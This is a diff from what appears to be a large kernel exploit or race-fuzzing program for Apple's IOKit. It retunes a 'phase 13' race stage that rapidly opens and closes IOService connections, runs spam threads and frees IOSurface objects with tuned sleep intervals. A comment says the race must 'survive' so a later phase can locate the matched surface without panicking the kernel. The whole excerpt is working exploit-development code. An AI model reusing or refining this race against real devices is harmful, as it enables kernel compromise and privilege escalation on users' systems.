@@ -19807,11 +19807,13 @@ new_modes:
 
             uint64_t inp13[3] = {1, 2, 3};
 
-            /* r=230 aggressive mode: 5x more iterations, tighter timing */
-            int p13_race8_iters  = (rounds == 230) ? 100 : 20;
-            int p13_vbig_iters   = (rounds == 230) ? 60  : 15;
-            int p13_surfch_iters = (rounds == 230) ? 80  : 20;
-            int p13_dereg_iters  = (rounds == 230) ? 80  : 20;
+            /* r=230 optimized mode: more iterations, same timing as r=229
+             * The race needs to SURVIVE so Phase 14 can binary-search the matched surface.
+             * Tighter timing causes kernel panics during the race itself. */
+            int p13_race8_iters  = (rounds == 230) ? 80  : 20;
+            int p13_vbig_iters   = (rounds == 230) ? 40  : 15;
+            int p13_surfch_iters = (rounds == 230) ? 60  : 20;
+            int p13_dereg_iters  = (rounds == 230) ? 60  : 20;
 
             /* v_race8: 8 connections, spam threads, staggered close */
             rlog("  Stage C phase 1: v_race8 x%d\n", p13_race8_iters);
@@ -19848,7 +19850,7 @@ new_modes:
                     for (int i = 0; i < 8; i++) {
                         int j = (i * 5 + r * 3) % 8;
                         if (have[j]) { IOServiceClose(cs[j]); have[j] = 0; }
-                        usleep(rounds == 230 ? (5 + (iter % 15) * 3) : (20 + (iter % 10) * 7));
+                        usleep(20 + (iter % 10) * 7);
                     }
                 p13_spam_run = 0;
                 for (int t = 0; t < 8; t++) pthread_join(spam_th[t], NULL);
@@ -19937,7 +19939,7 @@ new_modes:
 
                 for (int i = 7; i >= 0; i--) {
                     if (have[i]) { IOServiceClose(cs[i]); have[i] = 0; }
-                    usleep(rounds == 230 ? 10 : 30);
+                    usleep(30);
                 }
                 for (int i = 0; i < 64; i++) if (surfs[i]) CFRelease(surfs[i]);
                 p13_spam_run = 0;
@@ -20024,9 +20026,9 @@ new_modes:
                 for (int v = 0; v < 5; v++) CFRelease(schvals[v]);
                 CFRelease(schp);
 
-                usleep(rounds == 230 ? (50 + (iter % 20) * 10) : (200 + (iter % 30) * 25));
+                usleep(200 + (iter % 30) * 25);
                 IOServiceClose(c13);
-                usleep(rounds == 230 ? 100 : 400);
+                usleep(400);
                 p13_spam_run = 0;
                 for (int t = 0; t < 4; t++) pthread_join(spam_th[t], NULL);
 
